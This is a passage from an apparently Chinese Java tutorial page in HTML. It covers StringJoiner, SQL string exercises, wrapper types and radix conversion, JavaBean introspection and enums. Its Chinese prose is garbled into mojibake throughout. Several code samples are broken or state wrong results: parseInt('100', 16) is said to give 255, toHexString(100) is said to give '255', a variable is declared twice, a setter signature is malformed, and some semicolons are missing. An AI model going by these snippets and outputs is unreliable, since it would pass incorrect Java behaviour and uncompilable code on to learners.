&quot;:</span></span><br><span class="line">		sb.delete(sb.length()-<span class="number">2</span>, sb.length()).append(<span class="string">&quot;) VALUES (&quot;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (String st : fields) &#123;</span><br><span class="line">			sb.append(<span class="string">&quot;?, &quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		sb.delete(sb.length()-<span class="number">2</span>, sb.length()).append(<span class="string">&quot;)&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> sb.toString();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="StringJoiner">StringJoiner</h3>
<p>åœ¨ä¸Šé¢çš„é‚£ä¸ªç»ƒä¹ å½“ä¸­ï¼Œæˆ‘ä»¬éœ€è¦<code>, </code>æ¥åˆ†å‰²æ¯ä¸ªå­—æ®µï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨<code>StringJoiner</code>å¯¹è±¡æ¥å¹²è¿™äº‹ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.StringJoiner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String[] names = &#123;<span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;Grace&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">var</span> sj = <span class="keyword">new</span> StringJoiner(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String name: names) &#123;</span><br><span class="line">            sj.add(name);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sj.toString())</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¾“å‡º</span></span><br><span class="line"><span class="comment">// Bob, Alice, Grace</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¿˜å¯ä»¥æŒ‡å®šâ€œå¼€å¤´â€å’Œâ€œç»“å°¾â€ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.StringJoiner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String[] names = &#123;<span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;Grace&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">var</span> sj = <span class="keyword">new</span> StringJoiner(<span class="string">&quot;, &quot;</span>, <span class="string">&quot;Hello&quot;</span>, <span class="string">&quot;!&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String name: names) &#123;</span><br><span class="line">            sj.add(name);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sj.toString())</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¾“å‡º</span></span><br><span class="line"><span class="comment">// Hello Bob, Alice, Grace!</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å…¶å®ï¼Œ<code>String</code>è¿˜æä¾›äº†ä¸€ä¸ªé™æ€æ–¹æ³•<code>join()</code>ï¼Œè¿™ä¸ªæ–¹æ³•åœ¨å†…éƒ¨ä½¿ç”¨äº†<code>StringJoiner</code>æ¥æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œåœ¨ä¸éœ€è¦æŒ‡å®šâ€œå¼€å¤´â€å’Œâ€œç»“å°¾â€çš„æ—¶å€™ï¼Œç”¨<code>String.join()</code>æ›´æ–¹ä¾¿ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] names = &#123;<span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;Grace&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> s = String.join(<span class="string">&quot;,&quot;</span>, names);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="ç»ƒä¹ -v2">ç»ƒä¹ </h4>
<p>è¯·ä½¿ç”¨<code>StringJoiner</code>æ„é€ ä¸€ä¸ª<code>SELECT</code>è¯­å¥ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itranswarp.learnjava;</span><br><span class="line"><span class="keyword">import</span> java.util.StringJoiner;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Learn Java from https://www.liaoxuefeng.com/</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> liaoxuefeng</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		String[] fields = &#123; <span class="string">&quot;name&quot;</span>, <span class="string">&quot;position&quot;</span>, <span class="string">&quot;salary&quot;</span> &#125;;</span><br><span class="line">		String table = <span class="string">&quot;employee&quot;</span>;</span><br><span class="line">		String select = buildSelectSql(table, fields);</span><br><span class="line">		System.out.println(select);</span><br><span class="line">		System.out.println(<span class="string">&quot;SELECT name, position, salary FROM employee&quot;</span>.equals(select) ? <span class="string">&quot;æµ‹è¯•æˆåŠŸ&quot;</span> : <span class="string">&quot;æµ‹è¯•å¤±è´¥&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">static</span> String <span class="title">buildSelectSql</span><span class="params">(String table, String[] fields)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line">		<span class="keyword">var</span> sj = <span class="keyword">new</span> StringJoiner(<span class="string">&quot;, &quot;</span>, <span class="string">&quot;SELECT &quot;</span>, <span class="string">&quot; FROM &quot;</span>+table);</span><br><span class="line">		<span class="keyword">for</span> (String field: fields) &#123;</span><br><span class="line">			sj.add(field);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sj.toString();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="åŒ…è£…ç±»å‹">åŒ…è£…ç±»å‹</h3>
<p>Javaä¸ºæ¯ç§åŸºæœ¬ç±»å‹éƒ½æä¾›äº†å¯¹åº”çš„åŒ…è£…ç±»å‹ï¼š</p>
<table>
<thead>
<tr>
<th style="text-align:left">åŸºæœ¬ç±»å‹</th>
<th style="text-align:left">å¯¹åº”çš„å¼•ç”¨ç±»å‹</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">boolean</td>
<td style="text-align:left">java.lang.Boolean</td>
</tr>
<tr>
<td style="text-align:left">byte</td>
<td style="text-align:left">java.lang.Byte</td>
</tr>
<tr>
<td style="text-align:left">short</td>
<td style="text-align:left">java.lang.Short</td>
</tr>
<tr>
<td style="text-align:left">int</td>
<td style="text-align:left">java.lang.Integer</td>
</tr>
<tr>
<td style="text-align:left">long</td>
<td style="text-align:left">java.lang.Long</td>
</tr>
<tr>
<td style="text-align:left">float</td>
<td style="text-align:left">java.lang.Float</td>
</tr>
<tr>
<td style="text-align:left">double</td>
<td style="text-align:left">java.lang.Double</td>
</tr>
<tr>
<td style="text-align:left">char</td>
<td style="text-align:left">java.lang.Character</td>
</tr>
</tbody>
</table>
<p>ä½¿ç”¨é™æ€æ–¹æ³•<code>valueOf()</code>åˆ›å»º<code>Integer</code>å®ä¾‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">100</span>;</span><br><span class="line">        Integer n1 = Integer.valueOf(i);</span><br><span class="line">        Integer n2 = Integer.valueOf(<span class="string">&quot;100&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="è‡ªåŠ¨è£…ç®±å’Œè‡ªåŠ¨æ‹†ç®±">è‡ªåŠ¨è£…ç®±å’Œè‡ªåŠ¨æ‹†ç®±</h4>
<p><code>Int</code>å’Œ<code>Integer</code>å¯ä»¥ç›¸äº’è½¬æ¢ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">100</span>;</span><br><span class="line">Integer n = Integer.valueOf(i);</span><br><span class="line"><span class="keyword">int</span> x = n.intValue();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è€ŒJavaç¼–è¯‘å™¨å¯ä»¥å¸®åŠ©æˆ‘ä»¬è‡ªåŠ¨åœ¨<code>int</code>å’Œ<code>Integer</code>ç›´é™ç›¸äº’è½¬æ¢ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer n = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">int</span> x = n;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯è¿™æ ·åšå¯èƒ½ä¼šé€ æˆç©ºæŒ‡é’ˆå¼‚å¸¸çš„é”™è¯¯ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Integer n = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">int</span> i = n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="ä¸å˜æ€§">ä¸å˜æ€§</h4>
<p>ç”±äºåŒ…è£…ç±»å‹éƒ½å±äºå¼•ç”¨ç±»å‹ï¼Œæ‰€ä»¥ä¸€æ—¦åˆ›å»ºäº†åŒ…è£…ç±»å‹çš„å¯¹è±¡ï¼Œè¯¥å¯¹è±¡å°±æ˜¯ä¸å¯å˜çš„ã€‚</p>
<p>å’Œ<code>String</code>ç±»ä¼¼ï¼Œå¯¹äºä¸¤ä¸ª<code>Integer</code>å®ä¾‹è¿›è¡Œæ¯”è¾ƒå¿…é¡»ä½¿ç”¨<code>equals()</code>ï¼Œè€Œä¸èƒ½ä½¿ç”¨<code>==</code>ã€‚</p>
<h4 id="è¿›åˆ¶è½¬æ¢">è¿›åˆ¶è½¬æ¢</h4>
<p>æœ€å¸¸ç”¨çš„é™æ€æ–¹æ³•<code>parseInt()</code>å¯ä»¥æŠŠå­—ç¬¦ä¸²è§£ææˆä¸€ä¸ªæ•´æ•°ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> x1 = Integer.parseInt(<span class="string">&quot;100&quot;</span>); <span class="comment">// 100</span></span><br><span class="line"><span class="keyword">int</span> x2 = Integer.parseInt(<span class="string">&quot;100&quot;</span>, <span class="number">16</span>); <span class="comment">// 255</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>Integer</code>è¿˜å¯ä»¥æŠŠæ•´æ•°æ ¼å¼åŒ–ä¸ºæŒ‡å®šè¿›åˆ¶çš„å­—ç¬¦ä¸²ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(Integer.toString(<span class="number">100</span>)); <span class="comment">// &quot;100&quot;</span></span><br><span class="line">        System.out.println(Integer.toString(<span class="number">100</span>, <span class="number">36</span>)); <span class="comment">// &quot;2s&quot;</span></span><br><span class="line">        System.out.println(Integer.toHexString(<span class="number">100</span>)); <span class="comment">// &quot;255&quot;</span></span><br><span class="line">        System.out.println(Integer.toOctalString(<span class="number">100</span>)); <span class="comment">// &quot;144&quot;</span></span><br><span class="line">        System.out.println(Integer.toBinaryString(<span class="number">100</span>)); <span class="comment">// &quot;1100100&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ‰€æœ‰çš„æ•´æ•°å’Œæµ®ç‚¹æ•°çš„åŒ…è£…ç±»å‹éƒ½ç»§æ‰¿è‡ª<code>Number</code>ï¼Œå› æ­¤ï¼Œå¯ä»¥éå¸¸æ–¹ä¾¿åœ°ç›´æ¥é€šè¿‡åŒ…è£…ç±»å‹è·å–å„ç§åŸºæœ¬ç±»å‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å‘ä¸Šè½¬å‹ä¸ºNumber</span></span><br><span class="line">Number num = <span class="keyword">new</span> Integer(<span class="number">100</span>);</span><br><span class="line"><span class="comment">// è·å–byte, int, long, float, double;</span></span><br><span class="line"><span class="keyword">byte</span> b = num.byteValue();</span><br><span class="line"><span class="keyword">int</span> i = num.intValue();</span><br><span class="line"><span class="keyword">long</span> l = num.longValue();</span><br><span class="line"><span class="keyword">float</span> f = num.floatValue();</span><br><span class="line"><span class="keyword">double</span> d = num.doubleValue();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="æ— ç¬¦å·æ•´å‹">æ— ç¬¦å·æ•´å‹</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span> x = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span> x = <span class="number">127</span>;</span><br><span class="line">        System.out.println(Byte.toUnsignedInt(x)); <span class="comment">// 255</span></span><br><span class="line">        System.out.println(Byte.toUnsignedInt(x)); <span class="comment">// 127</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="JavaBean">JavaBean</h3>
<h4 id="å®šä¹‰">å®šä¹‰</h4>
<p>JavaBeanæ˜¯ä¸€ç§ç‰¹æ®Šä½†è¾ƒä¸ºå¸¸è§çš„<code>class</code>ï¼Œå®ƒç¬¦åˆä¸‹åˆ—è¦æ±‚ï¼š</p>
<ul>
<li>
<p>æœ‰è‹¥å¹²ä¸ª<code>private</code>å®ä¾‹å­—æ®µï¼›</p>
</li>
<li>
<p>é€šè¿‡<code>public</code>æ–¹æ³•æ¥è¯»å†™å®ä¾‹å­—æ®µï¼›</p>
</li>
<li>
<p>ä¸”è¯»å†™æ–¹æ³•ç¬¦åˆå¦‚ä¸‹å‘½åè§„èŒƒï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//è¯»æ–¹æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Type <span class="title">getXyz</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="comment">//å†™æ–¹æ³•</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> Type <span class="title">setXyz</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="ä½œç”¨">ä½œç”¨</h4>
<p>JavaBeanä¸»è¦ç”¨æ¥ä¼ é€’æ•°æ®ï¼Œå³æŠŠä¸€ç»„æ•°æ®ç»„åˆæˆä¸€ä¸ªJavaBeanä¾¿äºä¼ è¾“</p>
<h4 id="æšä¸¾JavaBeanå±æ€§">æšä¸¾JavaBeanå±æ€§</h4>
<p>è¦æšä¸¾ä¸€ä¸ªJavaBeançš„æ‰€æœ‰å±æ€§ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨Javaæ ¸å¿ƒåº“æä¾›çš„<code>Introspector</code>ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        BeanInfo info = Introspector.getBeanInfo(Person.class);</span><br><span class="line">        <span class="keyword">for</span> (PropertyDescriptor pd : info.getPropertyDescriptors()) &#123;</span><br><span class="line">            System.out.println(pd.getName());</span><br><span class="line">            System.out.println(<span class="string">&quot;  &quot;</span> + pd.getReadMethod());</span><br><span class="line">            System.out.println(<span class="string">&quot;  &quot;</span> + pd.getWriteMethod());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¾“å‡º</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">age</span></span><br><span class="line"><span class="comment">  public int Person.getAge()</span></span><br><span class="line"><span class="comment">  public void Person.setAge(int)</span></span><br><span class="line"><span class="comment">class</span></span><br><span class="line"><span class="comment">  public final native java.lang.Class java.lang.Object.getClass()</span></span><br><span class="line"><span class="comment">  null</span></span><br><span class="line"><span class="comment">name</span></span><br><span class="line"><span class="comment">  public java.lang.String Person.getName()</span></span><br><span class="line"><span class="comment">  public void Person.setName(java.lang.String)</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="æšä¸¾ç±»">æšä¸¾ç±»</h3>
<p>ç›´æ¥ä¸ŠğŸŒ°ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Weekday day = Weekday.SUN;</span><br><span class="line">        <span class="keyword">if</span> (day == Weekday.SUN || day == Weekday.SAT) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Work at home&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Work an office!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Weekday</span> </span>&#123;</span><br><span class="line">    SUN, MON, TUE, WED, THU, FRI, SAT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä¸<code>int</code>ç±»å‹çš„å¸¸é‡ç›¸æ¯”ï¼Œä½¿ç”¨<code>enum</code>å®šä¹‰æšä¸¾çš„ä¼˜åŠ¿æœ‰ï¼š</p>
<ul>
<li><code>enum</code>å¸¸é‡æœ¬èº«å¸¦æœ‰ç±»å‹ä¿¡æ¯ï¼Œå³<code>Weekday.SUN</code>çš„ç±»å‹æ˜¯<code>Weekday</code>ï¼›</li>
<li>ä¸å¯èƒ½å¼•ç”¨åˆ°éæšä¸¾çš„å€¼ï¼›</li>
<li>ä¸åŒç±»å‹çš„æšä¸¾ä¸èƒ½ç›¸äº’æ¯”è¾ƒæˆ–èµ‹å€¼ã€‚</li>
</ul>
<h4 id="enumçš„æ¯”è¾ƒ">enumçš„æ¯”è¾ƒ</h4>
<p><code>enum</code>æ˜¯ä¸€ä¸ªå¼•ç”¨ç±»å‹ï¼Œå‰é¢æåˆ°å¼•ç”¨ç±»å‹è¿›è¡Œæ¯”è¾ƒå¿…é¡»ä½¿ç”¨<code>equal()</code>ï¼Œå› ä¸º<code>==</code>æ¯”è¾ƒçš„æ˜¯ä¸¤ä¸ªå¼•ç”¨ç±»å‹çš„å˜é‡æ˜¯å¦æ˜¯åŒä¸€ä¸ªå¯¹è±¡ã€‚ä½†<code>enum</code>ç±»å‹å¯ä»¥ä¾‹å¤–ï¼Œ<strong>å› ä¸º<code>enum</code>ç±»å‹çš„æ¯ä¸ªå¸¸é‡åœ¨JVMä¸­åªæœ‰ä¸€ä¸ªå”¯ä¸€å®ä¾‹</strong>ã€‚æ‰€ä»¥ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">day == Weekday.FRI <span class="comment">//true</span></span><br><span class="line">day.equals(Weekday.FRI) <span class="comment">//true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="enumçš„æ–¹æ³•">enumçš„æ–¹æ³•</h4>
<h5 id="name">name()</h5>
<p>è¿”å›å¸¸é‡åï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String s = Weekday.SUN.name() <span class="comment">// &quot;SUN&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="ordinal">ordinal()</h5>
<p>è¿”å›å®šä¹‰å¸¸é‡çš„é¡ºåºï¼Œä¾‹å¦‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> n = Weekday.SUN.ordinal() <span class="comment">// 0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ”¹å˜æšä¸¾å¸¸é‡å®šä¹‰çš„é¡ºåºå°±ä¼šå¯¼è‡´<code>ordinal()</code>è¿”å›å€¼å‘ç”Ÿå˜åŒ–ã€‚</p>
<p>å¦‚æœæšä¸¾ç±»å‹è¦å’Œ<code>int</code>è½¬æ¢ï¼Œå¤„äºç¨‹åºçš„å¥å£®æ€§è€ƒè™‘ï¼Œå°±ä¸èƒ½ä¾é <code>ordinal()</code>çš„è¿”å›å€¼ã€‚å› ä¸º<code>enum</code>æœ¬èº«å°±æ˜¯ä¸€ä¸ªç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ¯ä¸ªæšä¸¾å¸¸é‡å¢åŠ ä¸€ä¸ªå­—æ®µï¼Œå¹¶å®šä¹‰<code>private</code>çš„æ„é€ æ–¹æ³•ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Weekday day = Weekday.SUN;</span><br><span class="line">        <span class="keyword">if</span> (day.dayValue == <span class="number">6</span> || day.dayValue == <span class="number">7</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Work at home!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Work at office!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Weekday</span> </span>&#123;</span><br><span class="line">    MON(<span class="number">1</span>), TUE(<span class="number">2</span>), WED(<span class="number">3</span>), THU(<span class="number">4</span>), FRI(<span class="number">5</span>), SAT(<span class="number">6</span>), SUN(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> dayValue;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Weekday</span><span class="params">(<span class="keyword">int</span> dayValue)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.dayValue = dayValue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="toString">toString()</h5>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œå¯¹æšä¸¾å¸¸é‡è°ƒç”¨<code>toString()</code>ä¼šè¿”å›å’Œ<code>name()</code>ä¸€æ ·çš„å­—ç¬¦ä¸²ã€‚ä½†æ˜¯ï¼Œ<code>toString()</code>å¯ä»¥è¢«è¦†å†™ï¼Œè€Œ<code>name()</code>åˆ™ä¸è¡Œã€‚æˆ‘ä»¬å¯ä»¥ç»™<code>Weekday</code>æ·»åŠ <code>toString()</code>æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Weekday day = Weekday.SUN;</span><br><span class="line">        <span class="keyword">if</span> (day.dayValue == <span class="number">6</span> || day.dayValue == <span class="number">7</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Today is &quot;</span> + day + <span class="string">&quot;. Work at home!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Today is &quot;</span> + day + <span class="string">&quot;. Work at office!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Weekday</span> </span>&#123;</span><br><span class="line">    MON(<span class="number">1</span>, <span class="string">&quot;æ˜ŸæœŸä¸€&quot;</span>), TUE(<span class="number">2</span>, <span class="string">&quot;æ˜ŸæœŸäºŒ&quot;</span>), WED(<span class="number">3</span>, <span class="string">&quot;æ˜ŸæœŸä¸‰&quot;</span>), THU(<span class="number">4</span>, <span class="string">&quot;æ˜ŸæœŸå››&quot;</span>), FRI(<span class="number">5</span>, <span class="string">&quot;æ˜ŸæœŸäº”&quot;</span>), SAT(<span class="number">6</span>, <span class="string">&quot;æ˜ŸæœŸå…­&quot;</span>), SUN(<span class="number">0</span>, <span class="string">&quot;æ˜ŸæœŸæ—¥&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> dayValue;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String chinese;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Weekday</span><span class="params">(<span class="keyword">int</span> dayValue, String chinese)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.dayValue = dayValue;</span><br><span class="line">        <span class="keyword">this</span>.chinese = chinese;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.chinese;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="Switch">Switch</h4>
